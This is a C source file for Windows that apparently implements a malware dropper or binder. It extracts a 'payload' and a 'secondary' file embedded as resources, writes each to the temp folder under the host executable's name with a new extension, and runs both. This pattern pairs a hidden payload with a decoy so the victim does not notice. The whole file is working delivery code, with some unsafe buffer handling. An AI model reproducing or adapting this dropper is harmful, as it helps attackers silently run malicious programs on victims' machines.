#include <stdio.h>
#include <windows.h>
#include <Shlwapi.h>

#pragma comment(lib, "Shlwapi.lib")

#define PAYLOAD_BUFFER_RSRC_ID 10
#define PAYLOAD_EXTENSION_RSRC_ID (PAYLOAD_BUFFER_RSRC_ID + 1)
#define SECONDARY_BUFFER_RSRC_ID 20
#define SECONDARY_EXTENSION_RSRC_ID (SECONDARY_BUFFER_RSRC_ID + 1)

typedef struct _FileStruct {
	PBYTE pBuffer;
	DWORD dwFileSize;
	LPSTR lpExtension;
	DWORD dwExtensionLength;
} FileStruct, *pFileStruct;

VOID Debug(LPCSTR fmt, ...) {
	va_list args;
	va_start(args, fmt);

	CHAR szBuffer[BUFSIZ];
	vsprintf(szBuffer, fmt, args);
	MessageBox(NULL, szBuffer, __argv[0], MB_OK | MB_ICONEXCLAMATION);

	va_end(args);
}

FileStruct *InitializeStruct(int nRsrcId) {
	FileStruct *fs = (FileStruct *)malloc(sizeof(*fs));
	if (fs == NULL) return NULL;


	HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(nRsrcId), RT_RCDATA);
	if (hRsrc == NULL) return NULL;
	fs->dwFileSize = SizeofResource(NULL, hRsrc);

	HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL) return NULL;
	fs->pBuffer = (PBYTE)LockResource(hGlobal);
	if (fs->pBuffer == NULL) return NULL;


	hRsrc = FindResource(NULL, MAKEINTRESOURCE(nRsrcId + 1), RT_RCDATA);
	if (hRsrc == NULL) return NULL;
	fs->dwExtensionLength = SizeofResource(NULL, hRsrc);

	hGlobal = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL) return NULL;
	fs->lpExtension = (PBYTE)LockResource(hGlobal);
	if (fs->lpExtension == NULL) return NULL;

	return fs;
}

BOOL DropFile(FileStruct *fs, LPSTR szFileNameBuffer) {
	DWORD dwWritten = 0;
	// get temp file name
	CHAR szTempFileName[MAX_PATH];
	CHAR szFileName[MAX_PATH];

	// get temp path
	GetTempPath(MAX_PATH, szTempFileName);
	// get file name (incl. path)
	GetModuleFileName(NULL, szFileName, MAX_PATH);
	// strip path and extract only executable name
	PathStripPath(szFileName);
	// append exe name to temp path
	PathAppend(szTempFileName, szFileName);
	// replace file extension
	memcpy(szTempFileName + strlen(szTempFileName) - 4, fs->lpExtension, fs->dwExtensionLength);
	strcpy(szFileNameBuffer, szTempFileName);

	// drop payload file
	HANDLE hFile = CreateFile(szTempFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		Debug("Create temp file error: %lu", GetLastError());
		return FALSE;
	}

	// write buffer into file
	if (WriteFile(hFile, fs->pBuffer, fs->dwFileSize, &dwWritten, NULL) == FALSE) {
		Debug("Write temp file error: %lu", GetLastError());
		CloseHandle(hFile);
		return FALSE;
	}
	// clean up
	CloseHandle(hFile);

	return TRUE;
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
	FileStruct *fsPayload = NULL, *fsSecondary = NULL;

	fsPayload = InitializeStruct(PAYLOAD_BUFFER_RSRC_ID);
	fsSecondary = InitializeStruct(SECONDARY_BUFFER_RSRC_ID);

	CHAR szPayloadFileName[BUFSIZ];
	CHAR szSecondaryFileName[BUFSIZ];

	DropFile(fsPayload, szPayloadFileName);
	DropFile(fsSecondary, szSecondaryFileName);
	free(fsPayload);
	free(fsSecondary);

	// execute payload
	if (ShellExecute(NULL, NULL, szPayloadFileName, NULL, NULL, SW_NORMAL) <= 32) {
		Debug("Start payload error: %lu", GetLastError());
		return 1;
	}

	// execute secondary file
	if (ShellExecute(NULL, NULL, szSecondaryFileName, NULL, NULL, SW_NORMAL) <= 32) {
		Debug("Start secondary error: %lu", GetLastError());
		return 1;
	}

	return 0;
}
